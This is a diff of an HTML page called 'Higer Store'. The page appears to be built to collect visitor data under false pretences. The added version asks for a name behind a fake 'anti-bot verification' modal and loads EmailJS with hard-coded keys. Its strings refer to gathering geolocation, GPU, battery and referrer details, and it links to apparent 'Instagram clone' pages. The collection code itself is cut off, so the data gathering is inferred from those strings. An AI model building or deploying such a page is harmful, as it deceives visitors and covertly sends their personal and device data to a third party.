@@ -1,572 +1,300 @@
 <!doctype html>
-<html lang="tr" dir="ltr" class="scroll-smooth"> 
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
-  <title>Higer Store | Neural Interface v3.0 Elite</title> 
-  <meta name="apple-mobile-web-app-capable" content="yes"> 
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
-  <meta name="theme-color" content="#050b14"> 
-  <script src="https://cdn.tailwindcss.com"></script> 
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script> 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"> 
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&amp;family=Orbitron:wght@400;700;900&amp;family=JetBrains+Mono:wght@300;500;800&amp;display=swap" rel="stylesheet"> 
-  <style>
-        :root {
-            --neon-blue: #00f2ff;
-            --neon-purple: #bc13fe;
-            --neon-pink: #ff00c1;
-            --cyber-black: #020617;
-            --terminal-green: #00ff41;
-            --glass: rgba(15, 23, 42, 0.75);
-        }
-
-        /* --- Global Reset & Scroll --- */
-        * { -webkit-tap-highlight-color: transparent; outline: none !important; }
-        ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-track { background: var(--cyber-black); }
-        ::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 10px; }
-
+<html lang="tr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Higer Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Cairo:wght@400;500;600;700&display=swap');
+        
+        html { scroll-behavior: smooth; }
         body { 
-            font-family: 'JetBrains Mono', monospace; 
-            background-color: var(--cyber-black); 
-            color: #e2e8f0;
-            overflow-x: hidden;
-            height: 100vh;
+            font-family: 'Inter', sans-serif; 
+            background-color: #0f172a; /* fallback */
+            background-image: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
         }
+        html[dir="rtl"] body { font-family: 'Cairo', sans-serif; }
 
-        .font-orbitron { font-family: 'Orbitron', sans-serif; }
-        .font-share { font-family: 'Share Tech Mono', monospace; }
+        @keyframes fadeInScaleUp { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        .animate-fade-in-scale-up { animation: fadeInScaleUp 0.3s ease-in-out forwards; }
+        
+        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .animate-slide-in-right { animation: slideInRight 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; }
+        
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
+        .animate-shake { animation: shake 0.5s ease-in-out; }
 
-        /* --- Matrix & Background Effects --- */
-        #matrix-canvas {
-            position: fixed;
-            top: 0; left: 0;
-            z-index: -1;
-            opacity: 0.15;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-left-color: #818cf8; animation: spin 1s linear infinite; }
+        
+        #status-message { transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
+        
+        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(30, 27, 75, 0.5); border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #6366f1; border-radius: 10px; border: 2px solid transparent; background-clip: content-box; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #818cf8; }
+        .custom-scrollbar { scrollbar-width: thin; scrollbar-color: #6366f1 rgba(30, 27, 75, 0.5); }
+        
+        .lang-btn { opacity: 0.6; transition: opacity 0.2s ease-in-out; }
+        .lang-btn.active, .lang-btn:hover { opacity: 1; transform: scale(1.1); }
 
-        #particles-canvas {
-            position: fixed;
-            inset: 0;
-            z-index: -2;
-        }
+        .link-button-icon { transition: transform 0.3s ease-in-out; }
+        .link-button:hover .link-button-icon { transform: scale(1.2) rotate(-5deg); }
+    </style>
+</head>
+<body class="text-gray-200">
 
-        .crt-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            z-index: 999;
-            background-size: 100% 3px, 3px 100%;
-            pointer-events: none;
-        }
+    <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen">
+        <h1 class="text-5xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 to-purple-400" data-translate-key="welcome_title">Hoş Geldiniz</h1>
+        <p class="text-lg text-gray-400 mb-8" data-translate-key="welcome_subtitle">Lütfen devam etmek için bilgileri onaylayın.</p>
+        <a href="https://t.me/code_unterstutzung" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center w-full max-w-md px-8 py-4 bg-sky-500 hover:bg-sky-600 text-white font-bold rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400/50" data-translate-key="join_telegram">
+            <i class="fab fa-telegram-plane text-2xl mr-3"></i> Telegram Grubumuza Katılın
+        </a>
+        <div id="link-buttons" class="w-full max-w-md mt-8"></div>
+    </div>
 
-        .scanline {
-            width: 100%;
-            height: 100px;
-            z-index: 1000;
-            background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(0, 242, 255, 0.05) 50%, rgba(0, 0, 0, 0) 100%);
-            opacity: 0.1;
-            position: absolute;
-            bottom: 100%;
-            animation: scanline 8s linear infinite;
-        }
+    <div id="modal-backdrop" class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+        <div id="modal-content" class="bg-gray-800/60 backdrop-blur-lg border border-gray-700 rounded-2xl shadow-2xl p-8 w-full max-w-md transform animate-fade-in-scale-up">
+            <div class="flex justify-center mb-6">
+                <div class="flex flex-wrap justify-center gap-x-3 gap-y-2 bg-gray-900/50 p-2 rounded-lg">
+                    <button id="lang-tr" class="lang-btn font-semibold px-2">TR</button>
+                    <button id="lang-de" class="lang-btn font-semibold px-2">DE</button>
+                    <button id="lang-en" class="lang-btn font-semibold px-2">EN</button>
+                    <button id="lang-fr" class="lang-btn font-semibold px-2">FR</button>
+                    <button id="lang-es" class="lang-btn font-semibold px-2">ES</button>
+                    <button id="lang-ar" class="lang-btn font-semibold px-2">AR</button>
+                </div>
+            </div>
 
-        @keyframes scanline {
-            0% { bottom: 100%; }
-            100% { bottom: -100px; }
-        }
+            <h2 class="text-2xl font-bold text-center text-white mb-4" data-translate-key="modal_title">Bilgilendirme</h2>
+            <p class="text-center text-gray-400 mb-6" data-translate-key="modal_text">Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.</p>
+            <div class="mb-6 relative">
+                <i class="fa-solid fa-user absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
+                <input type="text" id="visitor-name-input" class="w-full pl-12 pr-4 py-3 bg-gray-900/70 text-white border-2 border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition" data-translate-key="name_placeholder" placeholder="Adınızı giriniz...">
+            </div>
+            <div id="error-message" class="hidden text-center text-red-400 mb-4 font-semibold"></div>
+            <div class="flex flex-col sm:flex-row justify-center gap-4">
+                <button id="reject-btn" class="w-full px-6 py-3 bg-transparent hover:bg-gray-700/50 border-2 border-gray-600 text-white font-semibold rounded-lg shadow-md transition-all transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500" data-translate-key="reject_button">Reddet</button>
+                <button id="accept-btn" class="w-full px-6 py-3 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-semibold rounded-lg shadow-lg hover:shadow-indigo-500/40 transition-all transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-400" data-translate-key="accept_button">Kabul Et</button>
+            </div>
+        </div>
+    </div>
 
-        /* --- UI Components --- */
-        .glass-panel {
-            background: var(--glass);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
-        }
+    <div id="spinner-overlay" class="hidden fixed inset-0 bg-black/80 flex-col gap-4 flex items-center justify-center z-[60]">
+        <div class="spinner w-16 h-16 rounded-full"></div>
+        <p class="text-white text-lg font-semibold" data-translate-key="verifying_text">Doğrulanıyor...</p>
+    </div>
 
-        .cyber-card {
-            position: relative;
-            background: rgba(30, 41, 59, 0.4);
-            border-left: 3px solid var(--neon-blue);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            overflow: hidden;
-        }
-
-        .cyber-card:hover {
-            transform: scale(1.02) translateX(8px);
-            background: rgba(30, 41, 59, 0.6);
-            border-left: 3px solid var(--neon-purple);
-            box-shadow: -10px 0 20px rgba(188, 19, 254, 0.2);
-        }
-
-        .glitch-btn {
-            position: relative;
-            overflow: hidden;
-            transition: 0.3s;
-        }
-
-        .glitch-btn::after {
-            content: "SYSTEM_ACCESS";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--neon-blue);
-            color: black;
-            display: flex;
-            align-items: center;
-            justify-center;
-            transform: translateY(100%);
-            transition: 0.3s;
-        }
-
-        .glitch-btn:hover::after {
-            transform: translateY(0);
-        }
-
-        /* --- Animations --- */
-        .animate-flicker { animation: flicker 0.15s infinite; }
-        @keyframes flicker {
-            0% { opacity: 0.9; }
-            50% { opacity: 1; }
-            100% { opacity: 0.8; }
-        }
-
-        .data-stream {
-            animation: stream 20s linear infinite;
-        }
-
-        @keyframes stream {
-            from { transform: translateY(0); }
-            to { transform: translateY(-50%); }
-        }
-
-        .hue-rotate {
-            animation: hue 10s linear infinite;
-        }
-        @keyframes hue {
-            from { filter: hue-rotate(0deg); }
-            to { filter: hue-rotate(360deg); }
-        }
-
-        /* --- Responsive Adjustments --- */
-        @media (max-width: 640px) {
-            .container { padding-left: 1.5rem; padding-right: 1.5rem; }
-            .mobile-hide { display: none; }
-        }
-    </style> 
- </head> 
- <body class="antialiased selection:bg-cyan-500/30"> 
-  <canvas id="matrix-canvas"></canvas> 
-  <canvas id="particles-canvas"></canvas> 
-  <div class="crt-overlay"></div> 
-  <div class="scanline"></div> 
-  <header class="fixed top-0 w-full z-50 px-4 py-3 flex justify-between items-center glass-panel border-b border-white/10"> 
-   <div class="flex items-center gap-4"> 
-    <div class="relative group cursor-pointer" id="main-logo"> 
-     <div class="absolute -inset-1 bg-gradient-to-r from-cyan-500 to-purple-600 rounded blur opacity-25 group-hover:opacity-75 transition duration-1000"></div> 
-     <div class="relative w-12 h-12 bg-slate-900 rounded flex items-center justify-center border border-white/10"> <i class="fa-solid fa-microchip text-2xl text-cyan-400 group-hover:rotate-90 transition-transform duration-500"></i> 
-     </div> 
-    </div> 
-    <div> 
-     <h1 class="font-orbitron font-black text-xl tracking-tighter leading-none">HIGER <span class="text-cyan-500">V3</span></h1> 
-     <p class="text-[9px] font-share text-cyan-500/60 uppercase tracking-widest mt-1">Kernel: 8.4.1-Stable</p> 
-    </div> 
-   </div> 
-   <div class="flex items-center gap-6"> 
-    <div class="mobile-hide text-right font-share"> 
-     <div class="text-[10px] text-gray-500 uppercase">
-      System Latency
-     </div> 
-     <div id="ping-meter" class="text-xs text-green-500">
-      24ms
-     </div> 
-    </div> 
-    <div class="h-10 w-px bg-white/10 mobile-hide"></div> 
-    <div class="flex flex-col items-end font-share"> 
-     <div id="system-clock" class="text-lg font-bold text-white tracking-tighter">
-      00:00:00
-     </div> 
-     <div id="system-date" class="text-[10px] text-cyan-500/80">
-      2025-12-14
-     </div> 
-    </div> <button id="audio-master" class="w-10 h-10 rounded-lg border border-white/10 flex items-center justify-center hover:bg-white/5 transition-all text-gray-500"> <i class="fa-solid fa-volume-xmark"></i> </button> 
-   </div> 
-  </header> 
-  <aside class="fixed left-6 top-32 w-48 z-40 mobile-hide space-y-6"> 
-   <div class="glass-panel p-4 rounded-xl border-l-2 border-cyan-500"> 
-    <h3 class="text-[10px] font-share text-cyan-500 uppercase mb-3 tracking-widest">Resources</h3> 
-    <div class="space-y-4"> 
-     <div class="space-y-1"> 
-      <div class="flex justify-between text-[9px] font-mono"> <span>CPU</span><span id="cpu-val">12%</span> 
-      </div> 
-      <div class="h-1 bg-white/5 rounded-full overflow-hidden"> 
-       <div id="cpu-bar" class="h-full bg-cyan-500 transition-all duration-500" style="width: 12%"></div> 
-      </div> 
-     </div> 
-     <div class="space-y-1"> 
-      <div class="flex justify-between text-[9px] font-mono"> <span>MEM</span><span id="mem-val">44%</span> 
-      </div> 
-      <div class="h-1 bg-white/5 rounded-full overflow-hidden"> 
-       <div id="mem-bar" class="h-full bg-purple-500 transition-all duration-500" style="width: 44%"></div> 
-      </div> 
-     </div> 
-    </div> 
-   </div> 
-   <div class="glass-panel p-4 rounded-xl border-l-2 border-red-500"> 
-    <h3 class="text-[10px] font-share text-red-500 uppercase mb-2 tracking-widest">Active Threats</h3> 
-    <p class="text-[10px] text-gray-500 leading-tight">Firewall active. No breaches detected in last 24h.</p> 
-   </div> 
-  </aside> 
-  <main class="container mx-auto pt-32 pb-24 min-h-screen flex flex-col items-center relative"> 
-   <div class="text-center mb-12 transform transition-all"> 
-    <h2 class="font-orbitron text-5xl md:text-8xl font-black mb-4 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white via-gray-400 to-gray-800" data-translate-key="welcome_title"> AUTH REQUIRED </h2> 
-    <div class="flex items-center justify-center gap-3 font-share text-cyan-500 text-sm"> <span class="animate-pulse">●</span> <span id="status-text" class="uppercase tracking-[0.3em]">Waiting for biometric handshake...</span> 
-    </div> 
-   </div> 
-   <div class="w-full max-w-xl px-4"> <a href="https://t.me/code_unterstutzung" target="_blank" class="block w-full group mb-10"> 
-     <div class="relative p-[1px] overflow-hidden rounded-2xl"> 
-      <div class="absolute inset-0 bg-gradient-to-r from-cyan-500 via-purple-500 to-pink-500 animate-[hue_5s_linear_infinite]"></div> 
-      <div class="relative bg-slate-950 rounded-2xl p-6 flex items-center justify-between group-hover:bg-slate-900 transition-colors"> 
-       <div class="flex items-center gap-5"> 
-        <div class="w-14 h-14 bg-cyan-500/10 rounded-xl flex items-center justify-center border border-cyan-500/20 group-hover:scale-110 transition-transform"> <i class="fab fa-telegram-plane text-3xl text-cyan-400"></i> 
-        </div> 
-        <div> 
-         <h3 class="font-bold text-lg text-white" data-translate-key="join_telegram">TELEGRAM NETWORK</h3> 
-         <p class="text-xs text-gray-500 font-mono">ENCRYPTED_UPLINK // 256-BIT</p> 
-        </div> 
-       </div> <i class="fa-solid fa-chevron-right text-gray-700 group-hover:text-cyan-400 transition-all"></i> 
-      </div> 
-     </div> </a> 
-    <div class="relative mb-8 group"> 
-     <div class="absolute -inset-0.5 bg-cyan-500/20 rounded-full blur opacity-0 group-focus-within:opacity-100 transition duration-500"></div> 
-     <div class="relative"> <i class="fa-solid fa-search absolute left-6 top-1/2 -translate-y-1/2 text-cyan-500"></i> 
-      <input type="text" id="db-search" placeholder="Search Database..." class="w-full bg-slate-900/80 border border-white/10 rounded-full py-5 pl-14 pr-6 text-sm focus:outline-none focus:border-cyan-500/50 transition-all font-mono text-cyan-100"> 
-     </div> 
-    </div> 
-    <div id="links-container" class="grid grid-cols-1 md:grid-cols-2 gap-4"> 
-    </div> 
-   </div> 
-  </main> 
-  <footer class="fixed bottom-0 w-full z-40 px-6 py-2 glass-panel border-t border-white/5 flex justify-between items-center text-[9px] font-share text-gray-600 uppercase tracking-[0.2em]"> 
-   <div>
-    Nodes: 14 | Active User: <span id="visitor-ip-display">Detecting...</span>
-   </div> 
-   <div class="mobile-hide">
-    System Integrity: 99.98% | Higer OS v3.0.12-Final
-   </div> 
-   <div>
-    Region: <span id="visitor-region">...</span>
-   </div> 
-  </footer> 
-  <div id="access-gate" class="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-950"> 
-   <div class="absolute inset-0 opacity-20 overflow-hidden pointer-events-none"> 
-    <div class="data-stream text-[10px] font-mono text-cyan-800 space-y-2 select-none"> 
-     <p>010101101010010101010110101001010101011010100101</p> 
-    </div> 
-   </div> 
-   <div class="glass-panel w-full max-w-lg rounded-3xl p-8 border border-white/10 relative overflow-hidden"> 
-    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyan-500 to-transparent"></div> 
-    <div class="flex justify-center gap-2 mb-10"> <button data-lang="tr" class="lang-btn px-4 py-1.5 rounded bg-white/5 text-[10px] font-bold border border-white/10 hover:border-cyan-500 transition-all">TR</button> <button data-lang="en" class="lang-btn px-4 py-1.5 rounded bg-white/5 text-[10px] font-bold border border-white/10 hover:border-cyan-500 transition-all">EN</button> <button data-lang="de" class="lang-btn px-4 py-1.5 rounded bg-white/5 text-[10px] font-bold border border-white/10 hover:border-cyan-500 transition-all">DE</button> 
-    </div> 
-    <div class="text-center mb-10"> 
-     <div class="inline-block relative mb-6"> 
-      <div class="absolute -inset-4 bg-cyan-500/10 rounded-full animate-ping"></div> 
-      <div class="w-20 h-20 bg-slate-900 border-2 border-cyan-500/30 rounded-full flex items-center justify-center relative"> <i class="fa-solid fa-shield-halved text-4xl text-cyan-400"></i> 
-       <div class="absolute inset-0 border-2 border-cyan-400 rounded-full clip-path-scan" style="animation: rotate 4s linear infinite"></div> 
-      </div> 
-     </div> 
-     <h2 class="text-3xl font-orbitron font-bold text-white mb-3" data-translate-key="modal_title">BİLGİSAYAR ERİŞİMİ</h2> 
-     <p class="text-gray-400 text-sm font-share tracking-wider leading-relaxed" data-translate-key="modal_text">Sistem günlüklerine erişmek için kimliğinizi beyan etmeniz gerekmektedir.</p> 
-    </div> 
-    <div class="space-y-5"> 
-     <div class="relative"> 
-      <input type="text" id="auth-codename" class="w-full bg-black/50 border border-white/10 rounded-2xl py-5 px-6 text-white focus:outline-none focus:border-cyan-500 transition-all font-mono placeholder:text-gray-700" placeholder="IDENT_CODE_REQUIRED..." data-translate-key="name_placeholder"> 
-     </div> 
-     <div id="gate-error" class="hidden text-center text-red-500 text-[10px] font-mono uppercase animate-pulse"></div> 
-     <div class="grid grid-cols-2 gap-4"> <button id="gate-abort" class="py-4 rounded-2xl border border-white/10 font-bold text-xs tracking-[0.3em] hover:bg-red-500/10 transition-all uppercase" data-translate-key="reject_button">ABORT</button> <button id="gate-init" class="py-4 rounded-2xl bg-cyan-600 text-black font-black text-xs tracking-[0.3em] shadow-[0_0_30px_rgba(6,182,212,0.4)] hover:bg-cyan-400 transition-all uppercase" data-translate-key="accept_button">INITIALIZE</button> 
-     </div> 
-    </div> 
-   </div> 
-  </div> 
-  <div id="boot-screen" class="hidden fixed inset-0 z-[120] bg-black p-6 md:p-12 font-mono flex flex-col overflow-hidden"> 
-   <div class="flex items-center gap-4 mb-8 border-b border-white/10 pb-4"> 
-    <div class="w-3 h-3 rounded-full bg-red-500"></div> 
-    <div class="w-3 h-3 rounded-full bg-yellow-500"></div> 
-    <div class="w-3 h-3 rounded-full bg-green-500"></div> <span class="text-gray-600 text-[10px]">SYSTEM_LOADER_V3.LOG</span> 
-   </div> 
-   <div id="terminal-content" class="flex-1 space-y-1 overflow-y-auto text-[10px] md:text-xs leading-relaxed text-cyan-500/80"> 
-   </div> 
-   <div class="mt-8"> 
-    <div class="flex justify-between text-[10px] mb-2 text-cyan-500/40"> <span>UPLINK PROGRESS</span> <span id="load-pct">0%</span> 
-    </div> 
-    <div class="h-1 bg-white/5 rounded-full overflow-hidden"> 
-     <div id="load-bar" class="h-full bg-cyan-500 transition-all duration-300" style="width: 0%"></div> 
-    </div> 
-   </div> 
-  </div> 
-  <script>
-        /**
-         * HIGER OS v3.0 - CORE ENGINE
-         */
+    <div id="status-message" aria-live="polite" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[70] opacity-0 transform translate-x-full pointer-events-none"></div>
+    
+    <script>
         document.addEventListener('DOMContentLoaded', () => {
-            
-            // --- CONSTANTS ---
-            const EMAILJS_KEY = {
-                SERVICE: 'service_5uyhust',
-                TEMPLATE: 'template_5p9annp',
-                PUBLIC: 'F5cGGWMEHBUJTYWe_'
-            };
+            // --- SETTINGS ---
+            const EMAILJS_SERVICE_ID = 'service_5uyhust';
+            const EMAILJS_TEMPLATE_ID = 'template_5p9annp';
+            const EMAILJS_PUBLIC_KEY = 'F5cGGWMEHBUJTYWe_';
+            const startTime = new Date();
 
+            // --- TRANSLATIONS ---
             const translations = {
-                tr: { welcome_title: "HIGER OS v3", welcome_subtitle: "Güvenli protokol aktif.", join_telegram: "TELEGRAM AĞI", modal_title: "KİMLİK ONAYI", modal_text: "Bu birim, erişim verilerini şifreli günlüklerde depolar. Devam etmek için bir kod adı belirtin.", name_placeholder: "KOD ADI GİRİNİZ...", reject_button: "İPTAL", accept_button: "ERİŞİMİ BAŞLAT", link_chess: "Strateji Modülü", link_insta1: "Sosyal Portal A", link_pong: "Arcade Sistemi", link_insta2: "Sosyal Portal B" },
-                en: { welcome_title: "HIGER OS v3", welcome_subtitle: "Secure protocol active.", join_telegram: "TELEGRAM NETWORK", modal_title: "SYSTEM AUTH", modal_text: "This unit logs access data in encrypted journals. Specify a codename to proceed.", name_placeholder: "ENTER CODENAME...", reject_button: "ABORT", accept_button: "INITIALIZE", link_chess: "Strategy Module", link_insta1: "Social Portal A", link_pong: "Arcade System", link_insta2: "Social Portal B" },
-                de: { welcome_title: "HIGER OS v3", welcome_subtitle: "Sicherheitsprotokoll aktiv.", join_telegram: "TELEGRAM NETZWERK", modal_title: "SYSTEM AUTH", modal_text: "Diese Einheit speichert Zugriffsdaten in verschlüsselten Journalen.", name_placeholder: "CODENAME EINGEBEN...", reject_button: "ABBRUCH", accept_button: "INITIALISIEREN", link_chess: "Strategiemodul", link_insta1: "Soziales Portal A", link_pong: "Arcade System", link_insta2: "Soziales Portal B" }
+                tr: { page_title: "Higer Mağazası", welcome_title: "Hoş Geldiniz", welcome_subtitle: "Lütfen devam etmek için bilgileri onaylayın.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Telegram Grubumuza Katılın', modal_title: "Bilgilendirme", modal_text: "Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.", name_placeholder: "Adınızı giriniz...", reject_button: "Reddet", accept_button: "Kabul Et", error_must_accept: "Devam etmek için kabul etmelisiniz.", error_make_choice: "Lütfen bir seçim yapın.", error_enter_name: "Lütfen adınızı giriniz.", status_success: "Doğrulama başarılı. ✅", status_fail_send: "Doğrulama başarısız oldu. ❌", status_fail_critical: "Robot olmadığınız doğrulanamadı. Veri toplanamadı. ❌", status_fail_init: "Gönderim servisi başlatılamadı!", link_chess: "Satranç Oyunu", link_insta1: "Instagram Klon 1", link_pong: "Higer Pong Oyunu", link_insta2: "Instagram Klon 2", geo_unsupported: "API Desteklenmiyor", geo_denied: "Kullanıcı tarafından reddedildi", geo_unavailable: "Kullanılamıyor", gpu_fail: "Uzantı alınamadı", gpu_error: "Hata ile alınamadı", charging: "Şarj Oluyor", not_charging: "Şarj Olmuyor", yes: "Evet", no: "Hayır", unspecified: "Belirtilmemiş", direct_entry: "Doğrudan Giriş", verifying_text: "Doğrulanıyor..." },
+                de: { page_title: "Higer Store", welcome_title: "Willkommen", welcome_subtitle: "Bitte bestätigen Sie die Informationen, um fortzufahren.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Tritt unserer Telegram-Gruppe bei', modal_title: "Information", modal_text: "Diese Website bittet um Erlaubnis, Ihre Standortdaten für statistische Zwecke zu verwenden. Bitte geben Sie Ihren Namen ein und bestätigen Sie, um fortzufahren.", name_placeholder: "Geben Sie Ihren Namen ein...", reject_button: "Ablehnen", accept_button: "Akzeptieren", error_must_accept: "Sie müssen akzeptieren, um fortzufahren.", error_make_choice: "Bitte treffen Sie eine Auswahl.", error_enter_name: "Bitte geben Sie Ihren Namen ein.", status_success: "Überprüfung erfolgreich. ✅", status_fail_send: "Überprüfung fehlgeschlagen. ❌", status_fail_critical: "Anti-Bot-Prüfung fehlgeschlagen. Daten konnten nicht erfasst werden. ❌", status_fail_init: "Sendeservice konnte nicht initialisiert werden!", link_chess: "Schachspiel", link_insta1: "Instagram Klon 1", link_pong: "Higer Pong Spiel", link_insta2: "Instagram Klon 2", geo_unsupported: "API nicht unterstützt", geo_denied: "Vom Benutzer abgelehnt", geo_unavailable: "Nicht verfügbar", gpu_fail: "Erweiterung konnte nicht abgerufen werden", gpu_error: "Fehler beim Abrufen", charging: "Wird geladen", not_charging: "Wird nicht geladen", yes: "Ja", no: "Nein", unspecified: "Nicht angegeben", direct_entry: "Direkter Zugriff", verifying_text: "Verifizierung..." },
+                en: { page_title: "Higer Store", welcome_title: "Welcome", welcome_subtitle: "Please confirm the information to continue.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Join our Telegram Group', modal_title: "Information", modal_text: "This site requests permission to use your location data for statistical purposes. Please enter your name and confirm to continue.", name_placeholder: "Enter your name...", reject_button: "Reject", accept_button: "Accept", error_must_accept: "You must accept to continue.", error_make_choice: "Please make a selection.", error_enter_name: "Please enter your name.", status_success: "Verification successful. ✅", status_fail_send: "Verification failed. ❌", status_fail_critical: "Anti-bot check failed. Data could not be collected. ❌", status_fail_init: "Could not initialize sending service!", link_chess: "Chess Game", link_insta1: "Instagram Clone 1", link_pong: "Higer Pong Game", link_insta2: "Instagram Clone 2", geo_unsupported: "API Not Supported", geo_denied: "Denied by user", geo_unavailable: "Unavailable", gpu_fail: "Could not get extension", gpu_error: "Error retrieving", charging: "Charging", not_charging: "Not Charging", yes: "Yes", no: "No", unspecified: "Not specified", direct_entry: "Direct Entry", verifying_text: "Verifying..." },
+                fr: { page_title: "Boutique Higer", welcome_title: "Bienvenue", welcome_subtitle: "Veuillez confirmer les informations pour continuer.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Rejoignez notre groupe Telegram', modal_title: "Information", modal_text: "Ce site demande la permission d'utiliser vos données de localisation à des fins statistiques. Veuillez entrer votre nom et confirmer pour continuer.", name_placeholder: "Entrez votre nom...", reject_button: "Rejeter", accept_button: "Accepter", error_must_accept: "Vous devez accepter pour continuer.", error_make_choice: "Veuillez faire une sélection.", error_enter_name: "Veuillez entrer votre nom.", status_success: "Vérification réussie. ✅", status_fail_send: "La vérification a échoué. ❌", status_fail_critical: "Échec de la vérification anti-robot. Les données n'ont pas pu être collectées. ❌", status_fail_init: "Le service d'envoi n'a pas pu être initialisé!", link_chess: "Jeu d'échecs", link_insta1: "Clone d'Instagram 1", link_pong: "Jeu de Pong Higer", link_insta2: "Clone d'Instagram 2", geo_unsupported: "API non prise en charge", geo_denied: "Refusé par l'utilisateur", geo_unavailable: "Indisponible", gpu_fail: "Impossible d'obtenir l'extension", gpu_error: "Erreur de récupération", charging: "En charge", not_charging: "Pas en charge", yes: "Oui", no: "Non", unspecified: "Non spécifié", direct_entry: "Entrée directe", verifying_text: "Vérification..." },
+                es: { page_title: "Tienda Higer", welcome_title: "Bienvenido", welcome_subtitle: "Por favor, confirme la información para continuar.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Únete a nuestro grupo de Telegram', modal_title: "Información", modal_text: "Este sitio solicita permiso para usar sus datos de ubicación con fines estadísticos. Por favor, ingrese su nombre y confirme para continuar.", name_placeholder: "Ingrese su nombre...", reject_button: "Rechazar", accept_button: "Aceptar", error_must_accept: "Debe aceptar para continuar.", error_make_choice: "Por favor, haga una selección.", error_enter_name: "Por favor, ingrese su nombre.", status_success: "Verificación exitosa. ✅", status_fail_send: "La verificación falló. ❌", status_fail_critical: "Falló la verificación anti-bot. No se pudieron recopilar los datos. ❌", status_fail_init: "¡No se pudo inicializar el servicio de envío!", link_chess: "Juego de Ajedrez", link_insta1: "Clon de Instagram 1", link_pong: "Juego de Pong Higer", link_insta2: "Clon de Instagram 2", geo_unsupported: "API no compatible", geo_denied: "Denegado por el usuario", geo_unavailable: "No disponible", gpu_fail: "No se pudo obtener la extensión", gpu_error: "Error al recuperar", charging: "Cargando", not_charging: "No está cargando", yes: "Sí", no: "No", unspecified: "No especificado", direct_entry: "Entrada directa", verifying_text: "Verificando..." },
